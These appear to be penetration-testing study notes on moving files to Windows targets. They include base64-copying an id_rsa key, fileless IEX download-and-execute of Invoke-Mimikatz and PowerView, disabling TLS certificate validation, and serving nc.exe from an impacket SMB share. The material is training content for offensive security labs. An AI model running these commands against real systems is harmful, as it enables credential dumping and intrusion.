# Windows File Transfers

## PowerShell Base64 Encode & Decode

If a file is small in size, we can encode a file to base64 string, copy its content from the terminal and perform the reverse operation decoding the file in the original content

Primary usage: If the file content is very small in size and we have access to the terminal

### Encode file content to base64

```bash
cat id_rsa |base64 -w 0;echo
```

Copy this to a windows powershell ans use it to decode it

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("STRING"))
```

## PowerShell Web Downloads

PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:

| Method | Description |
| :----- | :---------- |
| OpenRead | Returns the data from a resource as a Stream. |
| OpenReadAsync | Returns the data from a resource without blocking the calling thread. |
| DownloadData | Downloads data from a resource and returns a Byte array. |
| DownloadDataAsync | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| DownloadFile | Downloads data from a resource to a local file. |
| DownloadFileAsync | Downloads data from a resource to a local file without blocking the calling thread. |
| DownloadString | Downloads a String from a resource and returns a String. |
| DownloadStringAsync | Downloads a String from a resource without blocking the calling thread. |

### PowerShell DownloadFile Method

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

**Example**

```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

### PowerShell DownloadString - Fileless Method

Fileless method means that we can use a file and executing it without saving the file itself to the disk. We can run it directly in memory using the Invoke-Expression cmdlet ot it's alias IEX

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX also accepts pipeline input

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell Invoke-WebRequest

Can be used to download files, we can also use its aliases iwr, curl, wget instead of the Invoke-WebRequest

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

### Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`

```
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads

### Create the SMB Server

```bash
impacket-smbserver [shareName] [sharePath]
```

Modern Windows settings prevent SMB v1 connections, but typically that results in a different error. We could try providing the SMB2 arguments

```bash
impacket-smbserver [shareName] -smb2support [sharePath]
```

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

To download a file from the SMB server to the current working directory, we can use the following command:

```
copy \\192.168.220.133\share\nc.exe
```

New versions of Windows block unauthenticated guest access, as we can see in the following command:

```
copy \\192.168.220.133\share\nc.exe
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now we can connect to it using 

```
net use n: \\192.168.220.133\share /user:test test
The command completed successfully.
copy n:\nc.exe
```

## FTP Downloads




# Linux File Transfers
